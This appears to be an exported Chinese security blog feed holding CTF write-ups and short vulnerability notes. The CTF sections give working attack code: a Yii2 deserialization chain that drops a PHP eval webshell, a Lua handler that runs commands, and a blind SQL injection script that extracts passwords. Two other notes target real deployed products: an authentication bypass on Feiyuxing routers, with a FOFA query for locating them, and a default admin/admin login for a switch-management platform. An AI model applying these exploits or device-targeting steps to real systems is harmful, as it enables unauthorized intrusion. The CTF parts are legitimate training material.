          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届红帽杯网络安全大赛</title>
      <link href="2021/05/09/2021redhat/"/>
      <url>2021/05/09/2021redhat/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><a href="https://pan.baidu.com/s/1M-GL3y5ES14xURbx4qCVJQ"><strong>附件</strong></a>（提取码：zlxu）</p><p>EBCDIC解码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509852121242506.png"></p><h2 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h2><p><a href="https://pan.baidu.com/s/1tBm_L_HkNkXUp5s1j4KMWw"><strong>附件</strong></a>（提取码：h3w8）</p><p>data2三个一组转RGB,然后data1里的数字就是对应的RGB的位置，然后根据data1的字符数量分解质因数得到宽高，最后画图去npiet解</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509191152075.png"></p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;data1&#x27;</span>)</span><br><span class="line">c1 = f1.read()</span><br><span class="line">c1 = c1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(<span class="built_in">len</span>(c1))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data2&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">3</span>):</span><br><span class="line">    yyy = c[i*<span class="number">3</span>:i*<span class="number">3</span>+<span class="number">3</span>]</span><br><span class="line">    r,g,b = yyy[<span class="number">0</span>],yyy[<span class="number">1</span>],yyy[<span class="number">2</span>]</span><br><span class="line">    res.append((r,g,b))</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">rr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1[:-<span class="number">1</span>]:</span><br><span class="line">    rr.append(res[<span class="built_in">int</span>(i)])</span><br><span class="line">print(rr)</span><br><span class="line">a = <span class="number">191</span></span><br><span class="line">b = <span class="number">37</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(b,a),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">        img.putpixel((j,i),rr[i+j*a])</span><br><span class="line">plt.imshow(img)</span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>发送个get请求（<code>//?code=&lt;?=phpinfo();?&gt;</code>），然后访问hack.php即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509114407282.png"></p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=/var/www/html/web/assets/5118a5d1/fonts/b.php&quot;,&quot;PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4K&quot;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;modelClass=<span class="string">&#x27;DynamicModel&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;scenario=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#http://eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6NDp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjE1MToiZmlsZV9wdXRfY29udGVudHMoInBocDovL2ZpbHRlci93cml0ZT1jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC93ZWIvYXNzZXRzLzUxMThhNWQxL2ZvbnRzL2IucGhwIiwiUEQ5d2FIQWdaWFpoYkNna1gwZEZWRnRoWFNrN1B6NEsiKSI7czoxMDoibW9kZWxDbGFzcyI7czoxMjoiRHluYW1pY01vZGVsIjtzOjg6InNjZW5hcmlvIjtzOjM6IjExMSI7fWk6MTtzOjM6InJ1biI7fX19fQ==</span></span><br></pre></td></tr></table></figure><p>接着构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com&#x2F;assets&#x2F;5118a5d1&#x2F;fonts&#x2F;harvey.php?a&#x3D;eval($_POST[harvey]); </span><br></pre></td></tr></table></figure><p>然后蚁剑成功连接，发现ua绕过保护执行命令，参考西湖论剑_web1.docx；</p><p>于是我们分别上传 <strong>.htaccess</strong> 和 <strong>3.lua</strong> 这两个文件</p><center>.htaccess</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><center>3.lua</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>最后去访问 <strong>3.lua</strong> 即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105098741998154565.png"></p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>sql盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://eci-2zeg1tmyhxfbqrmxi9m1.cloudeci1.ichunqiu.com/image.php?id=3&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;1234567890abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> s:</span><br><span class="line">        payloads=payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(b))</span><br><span class="line">        a=requests.get(url+payloads)</span><br><span class="line">        <span class="comment">#print(url+payloads)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a.text)&lt;<span class="number">19000</span>:</span><br><span class="line">            print(b)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>跑下脚本得到密码：dd6005ef9c77d5ae820ba；进而成功登录</p><p>然后ssrf，file:///flag得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105091656403626.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105092165628417.png"></p><h1 id="Crypto（原题）"><a href="#Crypto（原题）" class="headerlink" title="Crypto（原题）"></a>Crypto（原题）</h1><h2 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h2><p><a href="https://pan.baidu.com/s/1wPMpbhQ7NmFivQzZ1cpBzQ"><strong>附件</strong></a>（提取码：rlgc）</p><p>源自Baby Bubmi的wp：<a href="http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">from decimal import *</span><br><span class="line">import random</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">getcontext().prec &#x3D; int(100)</span><br><span class="line"></span><br><span class="line">primes &#x3D; [2]</span><br><span class="line">for i in range(3, 100):</span><br><span class="line">    f &#x3D; True</span><br><span class="line">    for j in primes:</span><br><span class="line">        if i * i &lt; j:</span><br><span class="line">            break</span><br><span class="line">        if i % j &#x3D;&#x3D; 0:</span><br><span class="line">            f &#x3D; False</span><br><span class="line">            break</span><br><span class="line">    if f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys &#x3D; []</span><br><span class="line">for i in range(len(primes)):</span><br><span class="line">    keys.append(Decimal(int(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr &#x3D; []</span><br><span class="line">for v in keys:</span><br><span class="line">    arr.append(int(v * int(16) ** int(64)))</span><br><span class="line"></span><br><span class="line">ct &#x3D; 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line"></span><br><span class="line">def encrypt(res):</span><br><span class="line">    h &#x3D; Decimal(int(0))</span><br><span class="line">    for i in range(len(keys)):</span><br><span class="line">        h +&#x3D; res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct &#x3D; int(h * int(16)**int(64))</span><br><span class="line">    return ct</span><br><span class="line"></span><br><span class="line">def f(N):</span><br><span class="line">    ln &#x3D; len(arr)</span><br><span class="line">    A &#x3D; Matrix(ZZ, ln + 1, ln + 1)</span><br><span class="line">    for i in range(ln):</span><br><span class="line">        A[i, i] &#x3D; 1</span><br><span class="line">        A[i, ln] &#x3D; arr[i] &#x2F;&#x2F; N</span><br><span class="line">        A[ln, i] &#x3D; 64</span><br><span class="line"></span><br><span class="line">    A[ln, ln] &#x3D; ct &#x2F;&#x2F; N</span><br><span class="line"></span><br><span class="line">    res &#x3D; A.LLL()</span><br><span class="line"></span><br><span class="line">    for i in range(ln + 1):</span><br><span class="line">        flag &#x3D; True</span><br><span class="line">        for j in range(ln):</span><br><span class="line">            if -64 &lt;&#x3D; res[i][j] &lt; 64:</span><br><span class="line">                continue</span><br><span class="line">            flag &#x3D; False</span><br><span class="line">            break</span><br><span class="line">        if flag:</span><br><span class="line">            vec &#x3D; [int(v + 64) for v in res[i][:-1]]</span><br><span class="line">            ret &#x3D; encrypt(vec)</span><br><span class="line">            if ret &#x3D;&#x3D; ct:</span><br><span class="line">                print(N, bytes(vec))</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;NO&quot;, ret, bytes(vec))</span><br><span class="line"></span><br><span class="line">for i in range(2, 10000):</span><br><span class="line">    print(i)</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure><h2 id="hpcurve"><a href="#hpcurve" class="headerlink" title="hpcurve"></a>hpcurve</h2><p><a href="https://pan.baidu.com/s/1k0GrX5-GDkilnECN0Q2y0Q"><strong>附件</strong></a>（提取码：97js）</p><p>源自 hxpCTF2020 的 hyper 的官方wp：<a href="https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup">https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup</a></p><p>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">p &#x3D; 10000000000000001119</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; &#x3D; GF(p)[]; y&#x3D;x</span><br><span class="line">f &#x3D; y + prod(map(eval, &#39;yyyyyyy&#39;))</span><br><span class="line">C &#x3D; HyperellipticCurve(f, 0)</span><br><span class="line">J &#x3D; C.jacobian()</span><br><span class="line">Ds &#x3D; [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]</span><br><span class="line"></span><br><span class="line">enc &#x3D; bytes.fromhex(&#39;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#39;)</span><br><span class="line">known_pt &#x3D; b&quot;a&quot;*20 + b&quot;flag&quot;</span><br><span class="line"></span><br><span class="line">rng_output &#x3D; bytes(e^^m for e,m in zip(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks &#x3D; [rng_output[i:i+8] for i in range(0, len(rng_output), 8)]</span><br><span class="line">ui &#x3D; [int.from_bytes(r, &#39;little&#39;) for r in blocks]</span><br><span class="line">u &#x3D; x^3 + ui[2]*x^2 + ui[1]*x + ui[0]</span><br><span class="line"></span><br><span class="line">L &#x3D; GF(p).algebraic_closure()</span><br><span class="line">roots &#x3D; [r[0] for r in u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; &#x3D; PolynomialRing(L)</span><br><span class="line">v &#x3D; RR.lagrange_polynomial([(xi, f(xi).sqrt()) for xi in roots])</span><br><span class="line">vi &#x3D; [v.coefficients()[i].as_finite_field_element()[1] for i in range(3)]</span><br><span class="line">vi &#x3D; [(int(-c), int(c)) for c in vi]</span><br><span class="line"></span><br><span class="line">for rs in itertools.product(*vi):</span><br><span class="line">    q &#x3D; struct.pack(&#39;&lt;&#39;+&#39;Q&#39;*len(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag &#x3D; bytes(k^^m for k,m in zip(2*(rng_output+q), enc))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红帽杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届“蓝帽杯”全国大学生网络安全技能大赛</title>
      <link href="2021/04/29/2021bluecat/"/>
      <url>2021/04/29/2021bluecat/</url>
      
        <content type="html"><![CDATA[<blockquote><p>蓝帽杯 —— 一场第一次不想进线下的CTF（全是取证俺不会.GIF</p></blockquote><h2 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h2><blockquote><p>滑雪也能玩出新花样？</p></blockquote><p>我还是老老实实打游戏得flag⑧</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042988745971.png"></p><p>原来改JS也行耶（treeBg.x = 1;  把树的随机生成改掉就能让他站到一旁</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429204414.png"></p><h2 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h2><blockquote><p>冰墩墩真可爱！</p><p><a href="https://pan.baidu.com/s/1xkQ8eP94lE4tFBPuslkHoA">附件</a>（提取码：lje3）</p></blockquote><p>解压出来一张图片，直接上来就是一套binwalk+foremost不讲武德套餐得到一个音频的包，cat一下发现一串疑似emoji-aes的表情</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042999875124.png"></p><p>这里我们根据提示八位数字再加上题目冬奥会想到应该是冬奥会开始的时间20220204，于是乎我们通过mp3stego去解密</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429148543.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042941414445.png"></p><p>接着我们去掉\x和空格拿去hex解密得到：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042987456.png"></p><p>发现是<a href="https://www.dcode.fr/wingdings-font"><strong>wingding字符</strong></a>，解码得到关键信息：A︎G︎i︎t︎H︎u︎b︎r︎e︎po︎s︎i︎t︎o︎r︎y︎n︎a︎m︎e︎d︎1︎c︎e︎P︎e︎a︎ki︎s︎v︎e︎r︎y︎i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎W︎h︎y︎n︎o︎t︎t︎a︎ke︎a︎l︎o︎o︎ka︎t︎i︎t︎?︎</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042956214471561465.png"></p><p>于是我们上GitHub搜索得到密钥：How_6ad_c0uld_a_1cePeak_be?</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429654123456.png"></p><p>最后<a href="https://aghorler.github.io/emoji-aes/"><strong>emoji-aes</strong></a>解密得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104291054664250.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝帽杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞鱼星路由器0day</title>
      <link href="2021/04/20/feiyuxing/"/>
      <url>2021/04/20/feiyuxing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一旦有了欲望，就会一发不可收拾</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自J0J0和佩琪师傅</p><p>飞鱼星企业级智能无线上网行为管理系统以及众多产品存在权限绕过漏洞</p><p>漏洞分类：逻辑漏洞<br>影响版本：全版本</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa语法：title&#x3D;&quot;飞鱼星&quot;</span><br></pre></td></tr></table></figure><p>①.智能无线上网行为管理系统</p><p>直接权限绕过，访问 index.html 或者 home/index.html 抓包，丢掉cookie.cgi就行了（我这里是全丢掉然后再停止抓包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041911886.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041922886.png"></p><p>而想要食用其他功能时，需要再次请求 cookie.cgi ，丢掉 cookie.cgi 并放过其他包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041933886.png"></p><p>②.智能上网管理行为系统</p><p>食用方法和上面的就没差.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041941953625.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210419456214886.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文网卫士交换机集中管理平台默认弱口令</title>
      <link href="2021/04/19/WenwangGuardian/"/>
      <url>2021/04/19/WenwangGuardian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>当你得到了能决定人生死的东西，心中的正义还不会变吗？</p></blockquote><h2 id="前言（起初是J0J0师傅发现的"><a href="#前言（起初是J0J0师傅发现的" class="headerlink" title="前言（起初是J0J0师傅发现的"></a>前言（起初是J0J0师傅发现的</h2><p>漏洞名称：文网卫士交换机集中管理平台默认弱口令</p><p>漏洞类型：弱口令</p><p>漏洞范围：较大</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>弱口令 yyds</p><p>账户密码：admin/admin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041974185675.png"></p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041974185858558.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯技能场景决赛</title>
      <link href="2021/04/17/happyhmgb/"/>
      <url>2021/04/17/happyhmgb/</url>
      
